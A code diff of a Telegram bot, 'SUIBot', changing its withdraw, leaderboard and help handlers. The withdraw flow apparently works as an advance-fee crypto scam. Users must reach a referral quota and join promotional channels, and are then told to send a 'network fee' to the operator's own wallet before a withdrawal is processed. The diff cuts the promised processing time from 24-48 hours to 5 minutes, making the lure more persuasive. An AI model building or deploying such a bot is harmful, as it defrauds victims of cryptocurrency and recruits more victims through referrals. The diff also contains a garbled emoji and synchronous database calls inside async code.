@@ -412,21 +412,36 @@ class SUIBot:
         )
 
     async def handle_withdraw(self, update: Update, user_data: dict):
+        """Handle withdraw command"""
         if not user_data.get("wallet"):
-            await update.message.reply_text("⚠️ Connect your wallet first!")
-            return
-
-        if user_data["referrals"] < REWARDS["min_referrals"]:
             await update.message.reply_text(
-                f"⚠️ You need at least {REWARDS['min_referrals']} referrals to withdraw!\n"
-                f"Your referrals: {user_data['referrals']}\n\n"
-                f"📢 You must also join our official channels:\n"
-                f"• @SUI_Capital_Tracker\n"
-                f"• @SUI_Capital_News\n"
-                f"• @SUI_Capital_QA"
+                "⚠️ Connect your wallet first using the 🔑 SUI Address button!"
             )
             return
 
+        # First show minimum requirements
+        await update.message.reply_text(
+            f"💰 Minimum Requirements for Withdrawal:\n\n"
+            f"• Minimum Balance: {REWARDS['min_withdraw']} SUI\n"
+            f"• Minimum Referrals: {REWARDS['min_referrals']}\n\n"
+            f"Your Current Status:\n"
+            f"• Balance: {user_data['balance']} SUI\n"
+            f"• Referrals: {user_data['referrals']}\n\n"
+            f"📢 Required Channels:\n"
+            f"• @SUI_Capital_Tracker\n"
+            f"• @SUI_Capital_News\n"
+            f"• @SUI_Capital_QA"
+        )
+
+        # Check referrals requirement
+        if user_data["referrals"] < REWARDS["min_referrals"]:
+            await update.message.reply_text(
+                f"⚠️ You need at least {REWARDS['min_referrals']} referrals to withdraw!\n"
+                f"Your referrals: {user_data['referrals']}"
+            )
+            return
+
+        # Check minimum balance
         balance = Decimal(user_data["balance"])
         if balance < REWARDS["min_withdraw"]:
             await update.message.reply_text(
@@ -435,15 +450,18 @@ class SUIBot:
             )
             return
 
+        # If all requirements are met, show withdrawal info
         await update.message.reply_text(
             f"⭐ Withdrawal Request\n\n"
             f"Amount to Withdraw: {balance} SUI\n"
             f"🔸 Destination Wallet: {user_data['wallet']}\n"
             f"🔸 Network Used: SUI Network (SUI)\n\n"
             f"📢 Network Fee: {REWARDS['network_fee']} SUI (required to process the transaction)\n\n"
-            f"📨 Please send the fee to the following wallet to complete your request:\n`{SUI_ADDRESS}`\n\n"
-            f"⌛ Processing Time: 24-48 hours after the fee payment is confirmed.\n\n"
-            f"⚠️ Important Note: The network fee is necessary to cover SUI network operational costs and ensure the success of your transfer. Without this payment, your request will not be processed."
+            f"📨 Please send the fee to the following wallet to complete your request:\n"
+            f"`{SUI_ADDRESS}`\n\n"
+            f"⌛ Processing Time: 5 minutes after the fee payment is confirmed.\n\n"
+            f"⚠️ Important Note: The network fee is necessary to cover SUI network operational costs "
+            f"and ensure the success of your transfer. Without this payment, your request will not be processed."
         )
 
     async def handle_wallet(self, update: Update):
@@ -457,25 +475,41 @@ class SUIBot:
         )
 
     async def handle_ranking(self, update: Update):
+        """Handle the leaders command"""
         try:
-            async with self.db_pool.connection() as conn:
-                async with conn.cursor() as cur:
-                    await cur.execute("""
-                        SELECT username, total_earned 
-                        FROM users 
-                        ORDER BY CAST(total_earned AS DECIMAL) DESC 
-                        LIMIT 10
-                    """)
-                    rows = await cur.fetchall()
+            conn = self.db_pool.get_connection()
+            with conn.cursor(cursor_factory=DictCursor) as cur:
+                cur.execute("""
+                    SELECT username, total_earned, referrals 
+                    FROM users 
+                    ORDER BY CAST(total_earned AS DECIMAL) DESC 
+                    LIMIT 10
+                """)
+                rows = cur.fetchall()
 
-            message = "🏆 Leaders:\n\n"
-            for i, row in enumerate(rows, 1):
-                username = row['username'] or "Anonymous"
-                message += f"{i}. @{username}: {row['total_earned']} SUI\n"
-            await update.message.reply_text(message)
+                if not rows:
+                    await update.message.reply_text("�� No leaders yet!")
+                    return
+
+                message = "🏆 Top 10 Leaders:\n\n"
+                for i, row in enumerate(rows, 1):
+                    username = row['username'] or "Anonymous"
+                    total_earned = Decimal(row['total_earned'])
+                    referrals = row['referrals']
+                    
+                    message += (
+                        f"{i}. @{username}\n"
+                        f"💰 Earned: {total_earned:.2f} SUI\n"
+                        f"👥 Referrals: {referrals}\n\n"
+                    )
+
+                await update.message.reply_text(message)
+
         except Exception as e:
-            logger.error(f"Error in ranking: {e}")
-            await update.message.reply_text("❌ Error loading ranking!")
+            logger.error(f"Error in ranking handler: {e}")
+            await update.message.reply_text(
+                "❌ Error loading leaderboard. Please try again later!"
+            )
 
     async def handle_help(self, update: Update):
         await update.message.reply_text(
@@ -486,7 +520,7 @@ class SUIBot:
             "• 👥 Referral Program\n\n"
             "💰 Withdrawal Information:\n"
             "• ⚡ Network: SUI (SUI)\n"
-            "• ⏱ Processing: 24-48h\n\n"
+            "• ⏱ Processing: 5 minutes\n\n"
             "📱 Official Channel:\n"
             "• @SUI_Capital_Tracker\n\n"
             "🔐 Security Notice:\n"
@@ -719,6 +753,11 @@ async def main():
         application.add_handler(MessageHandler(
             filters.TEXT & ~filters.COMMAND,
             bot.handle_message
+        ))
+        application.add_handler(CommandHandler("leaders", bot.handle_ranking))
+        application.add_handler(MessageHandler(
+            filters.Regex(r"^🏆 Leaders$"), 
+            bot.handle_ranking
         ))
         
         # Add error handler with retry logic
